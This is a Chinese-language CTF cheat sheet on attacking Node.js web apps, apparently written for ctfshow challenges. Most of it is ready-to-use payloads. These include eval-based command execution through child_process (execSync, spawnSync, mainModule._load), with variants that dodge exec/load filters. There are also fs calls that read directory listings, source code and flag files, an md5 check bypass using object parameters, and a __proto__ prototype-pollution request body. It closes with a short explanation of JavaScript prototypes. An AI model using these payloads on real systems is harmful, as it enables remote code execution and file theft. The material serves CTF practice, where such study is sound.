## **函数特性**
```
Character.toUpperCase()函数，字符ı会转变为I，字符ſ会变为S
Character.toLowerCase()函数，字符İ会转变为i，字符K会转变为k
```

绕过md5
```
 if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	res.end(flag);

?a[x]=1&b[x]=2或者a[:]=1&b[:]=1
?a[x]=1&b[x]=2 相当于是说，a和b都是引用数据类型（对象类型），
a={'x':'1'}
b={'x':'2'}
那么在 a+flag和 b+flag 时，他们的结果就会都是［objectObject]flag{xxx}，那么md5值自然就是一样的了。
```


^
## **eval命令执行**

```
eval(require("child_process").execSync('ls'))


?eval=require("child_process").execSync('ls')

?eval=require('child_process').execSync('ls').toString()

?eval=require("child_process")['exe'%2B'cSync']('ls')

?eval=require('child_process').spawnSync( 'ls', [ './' ] ).stdout.toString()

?eval=global.process.mainModule.constructor._load('child_process').execSync('ls')
```
```
//读文件夹，读文件函数
?eval=require('fs').readdirSync(".")
?eval=require('fs').readFileSync('./fl00g.txt','utf8');
```
```
//字符串拼接
?eval=var s='global.process.mainModule.constructor._lo';var b="ad('child_process').ex";var c="ec(%27ls>public/1.txt%27);";eval(s%2Bb%2Bc)%3B
```

^
有过滤exec|load。函数evalstring.search(/exec|load/i)
```
构造exec
?eval=require("child_process")['exe'%2B'cSync']('ls')

?eval=require( 'child_process' ).spawnSync( 'ls', [ '.' ] ).stdout.toString()
?eval=require( 'child_process' ).spawnSync( 'cat', [ 'f*' ] ).stdout.toString()
```

查看目录和源码
```
?eval=__filename 可以看到路径为/app/routes/index.js 
?eval=__dirname  看到/app/routes/
?eval=require('fs').readFileSync('/app/routes/index.js', 'utf-8')   查看源码
```



^
## **原型链污染**
类似于merge函数用于合并两个或多个对象的属性，将一个或多个源对象的属性复制到目标对象上。
可能造成原型链污染。
```
 var secert = {};
 let user = {};
 utils.copy(user,req.body);  //这里的copy类似merge函数
  if(secert.ctfshow==='36dboy'){
    res.end(flag);
  }
```
已知secert是对象类型，secert会继承类Object。
```
如果在secert继承到Object中的一个类有ctfshow属性值为36dboy，
那么secert.ctfshow值也为36dboy。

又每一个对象都有__proto__属性，结合copy函数，最终回溯到Object类，定义了一个ctfshow值为36dboy
```
于是POST传递请求体
```
{"__proto__":{"ctfshow":"36dboy"}}
```



^
## **原型链**
一个类必然有一些方法，类似属性this.bar，我们也可以将方法定义在构造函数内部：
```
function Foo() {
    this.bar = 1
    this.show = function() {
        console.log(this.bar)
    }
}

(new Foo()).show()
```
但这样写有一个问题，就是每当我们新建一个Foo对象时，this.show = function...就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在“类”中。

我希望在创建类的时候只创建一次show方法，这时候就则需要使用原型（prototype）了：
```
function Foo() {
    this.bar = 1
}

Foo.prototype.show = function show() {
    console.log(this.bar)
}

let foo = new Foo()
foo.show()
```


我们可以认为原型prototype是类Foo的一个属性，而所有用Foo类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的foo对象，其天生就具有foo.show()方法。

我们可以通过Foo.prototype来访问Foo类的原型，但Foo实例化出来的对象，是不能通过prototype访问原型的。这时候，就该__proto__登场了。

一个Foo类实例化出来的foo对象，可以通过foo.__proto__属性来访问Foo类的原型，也就是说：
```
foo.__proto__ == Foo.prototype
```

所以，总结一下：

prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法
一个对象的__proto__属性，指向这个对象所在的类的prototype属性
